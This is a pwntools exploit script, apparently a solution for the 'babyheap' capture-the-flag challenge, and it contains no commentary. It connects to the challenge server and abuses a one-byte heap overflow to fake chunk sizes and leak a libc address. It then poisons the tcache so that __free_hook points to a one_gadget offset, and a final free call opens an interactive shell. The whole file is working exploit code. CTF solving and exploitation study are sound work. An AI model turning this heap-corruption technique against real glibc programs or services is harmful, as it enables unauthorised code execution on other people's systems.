from pwn import *

e = ELF('./libc.so')
p = remote('babyheap.quals2019.oooverflow.io', 5000)


def malloc(size, content):
    p.recvuntil(">")
    p.sendline("M")
    p.recvuntil(">")
    p.sendline(str(size))
    p.recvuntil(">")
    p.send(content + '\x00')


def free(index):
    p.recvuntil(">")
    p.sendline("F")
    p.recvuntil(">")
    p.sendline(str(index))


def show(index):
    p.recvuntil(">")
    p.sendline("S")
    p.recvuntil(">")
    p.sendline(str(index))


for _ in range(9):
    malloc(0xf8, 'A' * 8)

free(0)
malloc(0xf8, 'A' * 0xf8 + chr(0x81))
free(0)
for i in range(8, 1, -1):
    free(i)

free(1)
malloc(0x170, 'D' * 0xff + 'Z')
show(0)
p.recvuntil('Z')
libc_base = p.recvline()[:-1]
libc_base = u64(libc_base + chr(0) * (8 - len(libc_base))) - 0x1e4ca0
print(hex(libc_base))

free(0)
malloc(0x170, 'D' * 0xf8 + chr(0x01) + chr(0x01))

malloc(0xf8, 'A')
malloc(0xf8, 'B')
malloc(0xf8, 'C')
free(1)
malloc(0xf8, 'A' * 0xf8 + chr(0x81))
free(2)
free(3)
malloc(0x170, 'D' * 0x100 + p64(libc_base + e.symbols['__free_hook']).replace('\x00', ''))

malloc(0xf8, 'AAAAAAAAAAA')
malloc(0xf8, p64(libc_base + 0xe2383).replace('\x00', ''))

free(3)

p.interactive()
